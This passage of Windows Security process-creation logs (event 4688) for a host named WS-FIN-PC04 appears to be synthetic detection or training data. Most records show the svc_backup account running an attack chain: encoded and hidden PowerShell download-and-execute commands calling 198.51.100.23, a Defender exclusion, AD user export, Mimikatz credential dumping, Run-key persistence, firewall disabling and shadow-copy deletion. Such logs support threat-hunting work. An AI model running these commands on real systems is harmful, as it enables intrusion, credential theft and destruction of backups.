  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:00:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-3946",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0xf604",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:04:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-7181",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0xe02f",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -ep bypass -c \"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:07:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-8157",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0x1572",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:09:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-3700",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0xc2a",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -c \"Get-ADUser -Filter * -Properties * | Export-CSV C:\\temp\\users.csv\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:12:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-5685",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0x1a92",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -c \"Invoke-Mimikatz -Command '\\\"sekurlsa::logonpasswords\\\"'\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:35:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-5706",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0x9441",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -c \"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svc.exe\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:36:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-2824",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0xd5ca",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -c \"netsh advfirewall set allprofiles state off\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:41:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-2249",
      "SubjectUserName": "jsmith",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0x1c58",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -c \"Get-EventLog -LogName System -Newest 10\"",
      "ParentProcessName": "C:\\Windows\\System32\\explorer.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-02-17T10:42:00Z",
    "Computer": "WS-FIN-PC04.corpsec.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Level": "Information",
    "Task": "Process Creation",
    "Keywords": "Audit Success",
    "EventData": {
      "SubjectUserSid": "S-1-5-21-123456789-3437",
      "SubjectUserName": "svc_backup",
      "SubjectDomainName": "CORPSEC",
      "NewProcessId": "0xd3a3",
      "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -c \"wmic shadowcopy delete /nointeractive\"",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "TokenElevationType": "%%1937",
      "MandatoryLabel": "S-1-16-8192"
    }
  }
]